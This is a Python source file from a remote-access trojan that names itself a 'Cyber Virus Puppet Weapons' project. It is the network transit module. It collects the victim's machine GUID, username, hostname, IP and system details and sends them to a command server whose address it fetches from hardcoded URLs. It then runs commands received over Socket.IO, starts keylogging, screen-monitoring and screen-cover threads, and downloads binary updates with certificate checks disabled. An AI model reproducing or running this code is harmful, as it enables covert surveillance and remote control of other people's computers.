# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLhread/Thread_TWNT
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# TWNetworkTransit - TerminationWirelessNetworkTransit
# Responsible for the transmission of data between the local and remote servers,
# And the transmission of data is divided into two parts,
# One is the local data, and the other is the remote data.
# The local data is stored in the local file,
# And the remote data is stored in the remote server.


from TLib import *
from TLib.T_imports import *
from . import Thread_TWNTWork
import TLib.T_Hardcoded as T_Hardcoded


def GetWindowsSystemINFO():
    return {
        'sys': {'platform': sys.platform, 'python_version': sys.version.split()[0], 'executable': sys.executable, 'cpu_count': os.cpu_count(), 'pid': os.getpid()},
        'os': {'login_user': os.getlogin(), 'cwd': os.getcwd()},
        'platform': {'system': platform.system(),'release': platform.release(), 'machine': platform.machine(), 'processor': platform.processor(), 'win32_ver': platform.win32_ver()},
        'socket': {'hostname': socket.gethostname(), 'ip_address': socket.gethostbyname(socket.gethostname())}
    }

def GetPCMachineGUID():
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as RegKey:
            GUID, _ = winreg.QueryValueEx(RegKey, "MachineGuid")
        return GUID
    except:
        try:
            if not os.path.exists(os.path.join(os.getenv("temp"), "TempPCMachineGUID")):
                try:
                    with open(os.path.join(os.getenv("temp"), "TempPCMachineGUID"), "w") as f: f.write(GUID()) 
                except: return "00000000-0000-0000-0000-000000000000"
            with open(os.path.join(os.getenv("temp", "TempPCMachineGUID", "r"))) as f: PCMachineGUID = f.read()
            return PCMachineGUID
        except: return "00000000-0000-0000-0000-000000000000"

class SHTTPAdapter(requests.adapters.HTTPAdapter):
    def __init__(self, ssl_context=None, **kwargs):
        self.ssl_context = ssl_context
        super().__init__(**kwargs)
    def init_poolmanager(self, *args, **kwargs):
        if self.ssl_context:
            kwargs['ssl_context'] = self.ssl_context
        return super().init_poolmanager(*args, **kwargs)

class TWNetworkTransit(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination') -> None:
        self.master: 'Termination4.Termination' = master
        self.__init_values__()
        self.ServerLoop()
    def __init_values__(self) -> None:
        self.GodKeys: T_GodKeys.GodKeys = self.master.GodKeys
        self.__version__: str = self.master.__version__
        self.PermanentAddress: list[str] = [
            "http://wytyh.space3v.work/T.json",
            "https://raw.githubusercontent.com/GVSDS/Termination/refs/heads/main/T.json"
        ]
        self.PermanentAddressHistory: dict[str, bool] = {}
        self.desc: str = "TWNetworkTransit"
        self.ECode: int = 0
        self.ECSCode: int = 0
        self.Updating: bool = False
        self.ConnectTime: float | None = None
        self.ConnectTimePoint: float | None = None
        self.namespace: str = "/Termination4SocketIOSpace"
        self.SSLContext: ssl.SSLContext = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        self.SSLContext.minimum_version = ssl.TLSVersion.TLSv1_2
        self.SSLContext.maximum_version = ssl.TLSVersion.TLSv1_2
        self.HttpSession: requests.Session = requests.Session()
        self.SecureHybridEncryption: T_GodKeys.SecureHybridEncryption = T_GodKeys.SecureHybridEncryption()
        # self.PublicKey: str | None = None
        # self.PrivateKey: str | None = None
        # self.HttpSession.verify = True
        self.HttpSession.mount('https://', SHTTPAdapter(ssl_context = self.SSLContext))
        try: self.ComputerINFO: dict = GetWindowsSystemINFO()
        except:
            self.ComputerINFO: dict = {}
            self.logger.Error("Failed To Prepare ComputerINFO")
        self.PCMachineGUID: str | None = GetPCMachineGUID().replace("-", "")
        self.Socket: socketio.Client = socketio.Client(
            reconnection = False,
            # reconnection_attempts = 500,
            # reconnection_delay = 1000,
            # engineio_logger = self.EngineioLogger,
            # logger = self.SocketLogger,
            # http_session = self.HttpSession,
        )
        if self.master.WorkMod == "py": self.__init_socketio_logger__()
        self.SocketIOregirst(self.Socket)
        self.Thread_RealTimeScreen: Thread_TWNTWork.TWNTRealTimeScreen | None = None
        self.Level: int = 15
        self.AddEditor("TFile", "TFile", "str")
        self.AddEditor("PermanentAddress", "PermanentAddress", "list")
        self.AddEditor("PCMachineGUID", "PCMachineGUID", "str")
        self.AddEditor("PATFile", "PATFile", "json")
        self.AddEditor("Level", "Level", "int")
        self.AddEditor("ECode", "ECode", "int")
        self.AddEditor("ECSCode", "ECSCode", "int")
        self.AddEditor("Updating", "Updating", "bool")
        self.AddEditor("ConnectTime", "ConnectTime", "bool")
        self.AddEditor("ConnectTimePoint", "ConnectTimePoint", "bool")
        self.AddEditor("namespace", "namespace", "str")
    def __init_socketio_logger__(self):
        self.SocketLoggerFile: str = os.path.join(os.getenv("temp"), "TSocketLogger.log")
        self.EngineioLoggerFile: str = os.path.join(os.getenv("temp"), "TEngineioLogger.log")
        try:
            if os.path.exists(self.SocketLoggerFile) and os.path.isfile(self.SocketLoggerFile): T_FIO.FIO.openw(self.SocketLoggerFile, "")
        except PermissionError: self.logger.Error(f"PermissionError {self.SocketLoggerFile}")
        except Exception as e: self.logger.Error(T_Std.ErrorFormat(e, "Failed To ReWrite SocketLoggerFile"))
        try:
            if os.path.exists(self.EngineioLoggerFile) and os.path.isfile(self.EngineioLoggerFile): T_FIO.FIO.openw(self.EngineioLoggerFile, "")
        except PermissionError: self.logger.Error(f"PermissionError {self.EngineioLoggerFile}")
        except Exception as e: self.logger.Error(T_Std.ErrorFormat(e, "Failed To ReWrite EngineioLoggerFile"))

        self.SocketLogger: logging.Logger = logging.getLogger("SocketIO Logger")
        self.SocketLogger.setLevel(logging.DEBUG)
        self.SocketLoggerFormatter: logging.Formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
        self.SocketLoggerFileHandler: logging.FileHandler = logging.FileHandler(self.SocketLoggerFile)
        self.SocketLoggerFileHandler.setFormatter(self.SocketLoggerFormatter)
        self.SocketLogger.addHandler(self.SocketLoggerFileHandler)

        self.EngineioLogger: logging.Logger = logging.getLogger("EngineIO Logger")
        self.EngineioLogger.setLevel(logging.DEBUG)
        self.EngineioLoggerFormatter: logging.Formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
        self.EngineioLoggerFileHandler: logging.FileHandler = logging.FileHandler(self.EngineioLoggerFile)
        self.EngineioLoggerFileHandler.setFormatter(self.EngineioLoggerFormatter)
        self.EngineioLogger.addHandler(self.EngineioLoggerFileHandler)

        self.Socket.logger = self.SocketLogger
        self.Socket.eio.logger = self.EngineioLogger
    # def __init_key__(self):
    #     self.PrivateKey: rsa.RSAPrivateKey = self.SecureHybridEncryption.CreatePrivateKey()
    #     self.PublicKey: rsa.RSAPublicKey = self.SecureHybridEncryption.CreatePublicKey(self.PrivateKey)
    def _RandomHeader(self) -> dict:
        return {'User-Agent': random.choice(T_Hardcoded.headers)}
    def VerifyTFile(self, Content: str | dict) -> bool:
        if type(Content) == str:
            try:
                Content: dict = ast.literal_eval(Content)
                if type(Content) != dict:
                    return False
            except Exception as e:
                if self.ECSCode <= 10:
                    self.logger.Error(T_Std.ErrorFormat(e, "Error For ReType"))
                return False
        if "X" not in Content: return False
        if "Host" not in Content: return False
        if "Port" not in Content: return False
        return True
    def _GetTFile(self) -> str | bool:
        for PA in self.PermanentAddress:
            try:
                _ = requests.get(PA, timeout = 10, headers = self._RandomHeader())
                if _.status_code == 200 and self.VerifyTFile(_.text):
                    if self.ECSCode <= 10 and self.ECode <= 10 and (PA not in self.PermanentAddressHistory or self.PermanentAddressHistory[PA] == False):
                        self.logger.Debug(f"GetTFile: {_.text}", Echo=False)
                    self.PermanentAddressHistory[PA] = True
                    return _.text
                else:
                    if self.ECSCode <= 10 and (PA not in self.PermanentAddressHistory or self.PermanentAddressHistory[PA]):
                        self.logger.Error(f"GetTFileFAILED: {_.status_code} {_.text}")
                    self.PermanentAddressHistory[PA] = False
            except Exception as e:
                if self.ECSCode <= 10 and (PA not in self.PermanentAddressHistory or self.PermanentAddressHistory[PA]):
                    self.logger.Error(T_Std.ErrorFormat(e, f"Error For Connect Node Server {PA}"))
                    self.PermanentAddressHistory[PA] = False
            self.ECSCode += 1
        return False
    def _ConnectServer(self) -> dict | bool:
        self.ECSCode: int = 0
        for _ in range(10):
            try:
                if not (r:=self._GetTFile()):
                    if self.ECSCode <= 10:
                        self.logger.Error("Failed To Get TFile")
                    continue
                TFile = json.loads(r)
                self.ECSCode: int = 0
            except Exception as e:
                self.logger.Error(T_Std.ErrorFormat(e, "Connect Node Server Error"))
                if self.ECSCode <= 10:
                    self.ECSCode += 1
                else: return self.PATFile
            else: return TFile
            time.sleep(1)
        return False
    def ServerLoop(self):
        self.logger.Debug(f"Server Loop Start.")
        #self.On_CallBack()
        self.On_Process()
        self.PATFile = { "X": "https", "Host":"www.gvsds.com", "Port":443 }
        while not self.ShouldStop():
            if not self.IsConnected:
                # Test Connect Time
                if self.ECode <= 10 or self.ECode % 10 == 0:
                    if self.ConnectTimePoint:
                        self.logger.Debug(f"Last Connect Keep {time.time() - self.ConnectTimePoint}s")
                    self.logger.Debug("Start To Try Connect")
                try:
                    if self.ECode <= 10: self.logger.Debug(f"Try To Connect [{self.PATFile['X']}://{self.PATFile['Host']}:{self.PATFile['Port']}]")
                    # self.__init_key__()
                    self._connect()
                    self.logger.Success("Connected")
                    self.logger.Success("Connected2Status") if self.IsConnected else self.logger.Error("!Connected2Status")
                    self.ECode = 0
                except Exception as e:
                    self.ECode+=1
                    if self.ECode <= 10: self.logger.Error(T_Std.ErrorFormat(e, f"Count [{self.ECode}] Error To Try Connect"))
                    if self.ECode % 100 == 0:
                        self.logger.Debug(f"Try to Check Update")
                        try:
                            r=requests.get(f"{self.PATFile['X']}://{self.PATFile['Host']}/TAPI/SHA256.api", verify=False, timeout=10)
                            if int(r.status_code) == 200:
                                if hasattr(self.master, "__file_sha256__") and self.master.tpll.IsSha256(r.text) and self.master.__file_sha256__ != r.text and not self.Updating and self.master.WorkMod == "exe":
                                    UBUF = Thread_TWNTWork.TWNEUpdateApp(self.master, {"Command": f"{self.PATFile['X']}://{self.PATFile['Host']}/FTP/Termination.bin"})
                                    self.master.TProcessManager.AddThread(UBUF)
                                    UBUF.start()
                                    self.Updating=True
                        except Exception as e:
                            if self.ECode <= 10:
                                self.logger.Error(T_Std.ErrorFormat(e, "TWNT Update Termination Error"))
                                continue
                            self.PATFile = { "X": "https", "Host": "www.gvsds.com", "Port": 443 }
                            if self.ECode != 0 and self.ECode % 2 != 0:
                                if self.ECode <= 10: self.logger.Debug("Getting PATFile...")
                                _PAT = self._ConnectServer()
                                if _PAT: self.PATFile = _PAT
            time.sleep(1)
        self.logger.Success("ShouldStop, Disconnect")
        self._disconnect()
    def SocketIOregirst(self, Socket: socketio.Client):
        Socket.on("connect", self.On_Connect, namespace="/Termination4SocketIOSpace")
        Socket.on("disconnect", self.On_Disconnect, namespace="/Termination4SocketIOSpace")
        Socket.on("Command", self.On_Command, namespace="/Termination4SocketIOSpace")
    def On_Connect(self):
        self.ConnectTime: float | None = time.time()
        self.ConnectTimePoint: float | None = time.time()
        self.logger.Success("Socket Connect.")
    def On_Disconnect(self, msg = None):
        self.ConnectTime: float | None = None
        self.logger.Error(f"Socket Disconnect. Msg: [{msg}]")
    def On_CallBack(self):
        def StartCallBack(n):
            self.Thread_TWNTProcessSynchronousWorker.ProcessSynchronous()
            self.logger.Debug(f"Thread [{n}] Start")
        def EndCallBack(n):
            self.Thread_TWNTProcessSynchronousWorker.ProcessSynchronous()
            self.logger.Debug(f"Thread [{n}] End")
        self.master.TProcessManager.AddStartCallBack(StartCallBack)
        self.master.TProcessManager.AddEndCallBack(EndCallBack)
    def On_Command(self, data):
        # data = self.SecureHybridEncryption.Decrypt(data, self.PrivateKey)
        CBUF = Thread_TWNTWork.TWNETProcess(self.master, self, data)
        self.master.TProcessManager.AddThread(CBUF)
        CBUF.start()
    def On_Process(self):
        self.Thread_MonitorWorker: Thread_TWNTWork.MonitorWorker =                               Thread_TWNTWork.MonitorWorker(self.master, self)
        self.Thread_ListenKMWorker: Thread_TWNTWork.ListenKMWorker =                             Thread_TWNTWork.ListenKMWorker(self.master, self)
        self.Thread_TWNESynchronousTProcess: Thread_TWNTWork.TWNESynchronousTProcess =           Thread_TWNTWork.TWNESynchronousTProcess(self)
        self.Thread_TWNTProcessSynchronousWorker: Thread_TWNTWork.TWNTProcessSynchronousWorker = Thread_TWNTWork.TWNTProcessSynchronousWorker(self.master, self)
        self.Thread_TWNTCoverScreen: Thread_TWNTWork.TWNTCoverScreen =                           Thread_TWNTWork.TWNTCoverScreen(self.master, self)
        self.master.TProcessManager.AddThread(self.Thread_MonitorWorker)
        self.master.TProcessManager.AddThread(self.Thread_ListenKMWorker)
        self.master.TProcessManager.AddThread(self.Thread_TWNESynchronousTProcess)
        self.master.TProcessManager.AddThread(self.Thread_TWNTProcessSynchronousWorker)
        self.master.TProcessManager.AddThread(self.Thread_TWNTCoverScreen)
        self.Thread_MonitorWorker.start()
        self.Thread_ListenKMWorker.start()
        self.Thread_TWNESynchronousTProcess.start()
        self.Thread_TWNTProcessSynchronousWorker.start()
        self.Thread_TWNTCoverScreen.start()
        self.master.Thread_MonitorWorker = self.Thread_MonitorWorker
        self.master.Thread_ListenKMWorker = self.Thread_ListenKMWorker
        self.master.Thread_TWNESynchronousTProcess = self.Thread_TWNESynchronousTProcess
        self.master.Thread_TWNTProcessSynchronousWorker = self.Thread_TWNTProcessSynchronousWorker
        self.master.Thread_TWNTCoverScreen = self.Thread_TWNTCoverScreen
    def _connected(self, namespace: str = "/Termination4SocketIOSpace") -> str | bool:
        if namespace in self.Socket.namespaces: return self.Socket.namespaces[namespace]
        return False
    def emit(self, event: str, *args: typing.Any, **kwargs: typing.Any) -> None:
        data: str | int | bytes | tuple | dict | None = None
        if len(args) == 1 and not kwargs: data: typing.Any = args[0]
        if args: data = args
        namespace: str | None = kwargs["namespace"] if "namespace" in kwargs else self.namespace
        IsEncrypt: bool = kwargs["IsEncrypt"] if "IsEncrypt" in kwargs else True
        callback: typing.Callable = kwargs["callback"] if "callback" in kwargs else None
        if kwargs:
            data: dict = kwargs
            if "namespace" in data: del data["namespace"]
            if "IsEncrypt" in data: del data["IsEncrypt"]
            if "callback" in data: del data["callback"]
        # data: str | int | bytes | tuple | dict | None = self.SecureHybridEncryption.Encrypt(data, self.PublicKey) if IsEncrypt else data
        self.Socket.emit(event, data, namespace = namespace, callback = callback)
    def _connect(self) -> None:
        self._disconnect()
        self.Socket.connect(f"{self.PATFile['X']}://{self.PATFile['Host']}:{self.PATFile['Port']}",
                                headers = {"Data": self.GodKeys.encrypt_16({
                                        "PCMachineGUID": self.PCMachineGUID,
                                        "PCVersion": self.__version__,
                                        "PCompilation": str(self.master.Version.version["Compilation"]["Runs"]),
                                        "PCName": socket.gethostname(),
                                        "PCreateUserName": os.getenv('USERNAME'),
                                        "PCSystemINFO": self.ComputerINFO,
                                        # "PrivateKey": self.GodKeys.encrypt_16(self.SecureHybridEncryption.SerializePrivateKey(self.PrivateKey)),
                                    })},
                                wait_timeout = 60,
                                namespaces = ["/Termination4SocketIOSpace"],
                                transports = ["websocket"],
                                socketio_path="/socket.io",
                            )
    def _disconnect(self) -> None:
        self.Socket.disconnect()
        if self.Socket.namespaces: self.Socket.namespaces = {}
        if self.Socket.connected: self.Socket.connected = False
    @property
    def IsConnected(self) -> str | bool:
        return hasattr(self, "Socket") and self.Socket and self._connected("/Termination4SocketIOSpace")
